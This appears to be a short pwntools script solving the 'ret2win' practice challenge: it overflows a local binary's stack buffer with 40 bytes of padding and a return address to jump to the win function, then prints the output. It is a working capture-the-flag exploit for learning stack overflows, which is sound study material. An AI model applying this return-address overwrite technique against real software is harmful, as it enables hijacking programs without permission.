from pwn import *

p = process('./ret2win')

junk_sz = 40
p.sendline(b'a' * junk_sz + p64(0x400811))
#  p.interactive()
p.wait()
print(p.recvall().decode())
